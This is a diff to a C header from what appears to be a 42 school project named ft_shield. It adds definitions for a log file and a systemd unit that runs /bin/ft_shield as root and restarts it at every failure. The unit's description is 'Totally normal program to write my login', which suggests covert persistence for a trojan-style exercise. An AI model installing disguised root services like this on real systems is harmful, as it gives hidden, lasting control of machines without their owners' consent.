@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 11:24:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/23 09:56:37 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/23 10:57:55 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -42,6 +42,24 @@
 # define LOGIN_42 "mbatty"
 
 # define LOCK_FILE "/var/lock/ft_shield.lock"
+# define LOG_FILE "/var/log/ft_shield.log"
+# define SERVICE_FILE "/etc/systemd/system/ft_shield.service"
+
+# define SERVICE_FILE_CONTENT "\
+[Unit]\n\
+Description=Totally normal program to write my login\n\
+After=network.target\n\
+StartLimitIntervalSec=0\n\
+[Service]\n\
+Type=forking\n\
+PIDFile=/var/lock/ft_shield.lock\n\
+Restart=always\n\
+RestartSec=1\n\
+User=root\n\
+ExecStart=/bin/ft_shield\n\
+\n\
+[Install]\n\
+WantedBy=multi-user.target"
 
 typedef enum e_log_type
 {
